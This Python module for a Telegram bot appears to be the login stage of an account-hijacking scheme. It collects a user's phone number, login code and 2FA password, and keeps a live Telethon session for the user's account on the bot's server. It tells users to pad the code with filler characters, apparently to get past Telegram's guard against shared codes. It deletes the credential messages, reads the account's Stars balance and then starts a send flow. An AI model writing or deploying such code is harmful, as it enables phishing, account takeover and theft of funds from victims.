import os
import time
import re
import asyncio
from config import API_ID, API_HASH
from db import set_authed
from utils import get_session_path, delete_messages, get_stars_balance
from telethon import TelegramClient
from telethon.errors import SessionPasswordNeededError

states = {}

async def cleanup_auth_state(bot, uid, reason):
    if uid not in states:
        return
    
    state = states[uid]
    try:
        if state.get("auth_messages"):
            await delete_messages(bot, uid, state["auth_messages"])
        if state.get("flow_msg_id"):
            await bot.delete_messages(uid, [state["flow_msg_id"]])
        if state.get("auth_client"):
            try:
                await state["auth_client"].disconnect()
            except:
                pass
        try:
            await bot.send_message(uid, f"{reason}\nPlease restart the authentication with /login.")
        except Exception:
            pass
    except Exception:
        pass
    finally:
        if uid in states:
            del states[uid]

async def check_timeouts(bot):
    while True:
        await asyncio.sleep(60)
        now = time.time()
        for uid in list(states.keys()):
            state = states[uid]
            if state.get("state") in ("AWAITING_PHONE", "AWAITING_CODE", "AWAITING_2FA"):
                started = state.get("started_at")
                if started and (now - started) > 300:
                    await cleanup_auth_state(bot, uid, "Authentication process timed out after 5 minutes of inactivity.")

async def start_auth(bot, event, uid):
    session_path = get_session_path(uid)
    
    if os.path.exists(session_path):
        try:
            test_client = TelegramClient(session_path, API_ID, API_HASH)
            await test_client.connect()
            if not await test_client.is_user_authorized():
                os.remove(session_path)
            await test_client.disconnect()
        except:
            if os.path.exists(session_path):
                os.remove(session_path)

    client = TelegramClient(session_path, API_ID, API_HASH)
    await client.connect()
    
    states[uid] = {
        "state": "AWAITING_PHONE",
        "auth_client": client,
        "auth_messages": [],
        "data": {},
        "started_at": time.time()
    }
    
    msg = await event.respond("Please enter your phone number with country code:")
    states[uid]["auth_messages"].append(msg.id)

async def finalize_auth(bot, event, uid, client):
    set_authed(uid, 1)
    balance = await get_stars_balance(client)
    await client.disconnect()
    await event.respond(f"Authentication successful! Your star balance: {balance:.1f}")

    if uid in states:
        del states[uid]
    
    from send import start_send_flow
    await start_send_flow(bot, event)

async def handle_auth_message(bot, event, uid, state):
    if state["state"] == "AWAITING_PHONE":
        phone = event.message.text.strip()
        if not re.match(r"^\+\d+$", phone):
            await event.reply("Invalid phone number. Please include country code (e.g. +1234567890).")
            return
        await event.delete()
        await delete_messages(bot, event.chat_id, state["auth_messages"])
        state["auth_messages"] = []
        client = state["auth_client"]
        try:
            await client.send_code_request(phone)
            state["state"] = "AWAITING_CODE"
            state["data"]["phone"] = phone
            state["started_at"] = time.time()
            msg = await event.respond(
                "Verification code sent. Please enter the code.\n"
                "You can enter it like 1xxx2xxx3xxx4xxx5 – we will extract only the digits."
            )
            state["auth_messages"].append(msg.id)
        except Exception as e:
            await event.respond(f"Error sending code: {str(e)}")
            await client.disconnect()
            del states[uid]
            
    elif state["state"] == "AWAITING_CODE":
        raw = event.message.text.strip()
        code = re.sub(r'\D', '', raw)
        if not code:
            await event.reply("Please enter a valid code (digits only).")
            return
        await event.delete()
        await delete_messages(bot, event.chat_id, state["auth_messages"])
        state["auth_messages"] = []
        client = state["auth_client"]
        try:
            await client.sign_in(code=code)
            await finalize_auth(bot, event, uid, client)
        except SessionPasswordNeededError:
            state["state"] = "AWAITING_2FA"
            state["started_at"] = time.time()
            msg = await event.respond("2FA is enabled. Please enter your password:")
            state["auth_messages"].append(msg.id)
        except Exception as e:
            await event.respond(f"Authentication failed: {str(e)}")
            await client.disconnect()
            del states[uid]
            
    elif state["state"] == "AWAITING_2FA":
        password = event.message.text.strip()
        await event.delete()
        await delete_messages(bot, event.chat_id, state["auth_messages"])
        state["auth_messages"] = []
        client = state["auth_client"]
        try:
            await client.sign_in(password=password)
            await finalize_auth(bot, event, uid, client)
        except Exception as e:
            await event.respond(f"2FA failed: {str(e)}")
            await client.disconnect()
            del states[uid]
